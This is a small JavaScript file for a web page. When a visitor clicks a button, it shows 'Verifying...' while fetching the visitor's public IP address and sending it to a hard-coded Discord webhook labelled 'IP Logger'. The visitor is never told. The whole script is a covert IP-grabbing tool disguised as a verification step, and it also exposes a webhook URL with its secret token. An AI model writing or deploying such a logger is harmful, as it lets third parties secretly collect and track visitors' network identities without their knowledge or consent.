async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error fetching IP:', error);
        return 'Error: Could not fetch IP';
    }
}

async function sendToWebhook(ip) {
    const webhookUrl = 'https://discord.com/api/webhooks/1444881923909619712/rrsDVZbrvQxBYnNPrsWP2wLBpAOxZxvi4QTwDIoJyof_bZWP-TrO_so9z0ehii2qSIUP';
    const messageContent = "New user IP: " + ip;
    const payload = {
        content: messageContent,
        username: 'IP Logger',
        avatar_url: 'https://i.imgur.com/4M34hi2.png'
    };

    try {
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        if (!response.ok) {
            const errorText = await response.text();
            console.error('Webhook response error:', response.status, errorText);
        } else {
            console.log('IP sent successfully to Discord.');
        }
    } catch (error) {
        console.error('Error sending to webhook:', error);
    }
}

// This is the main function that runs when the button is clicked
async function handleProceedClick() {
    const button = document.getElementById('proceedButton');
    
    // Disable the button to prevent multiple clicks
    button.disabled = true;
    button.textContent = 'Verifying...';

    const ip = await getIP();
    await sendToWebhook(ip);

    // Optional: Redirect the user after the action is complete
    // window.location.href = 'https://google.com';
}

// Add an event listener to the button
document.getElementById('proceedButton').addEventListener('click', handleProceedClick);
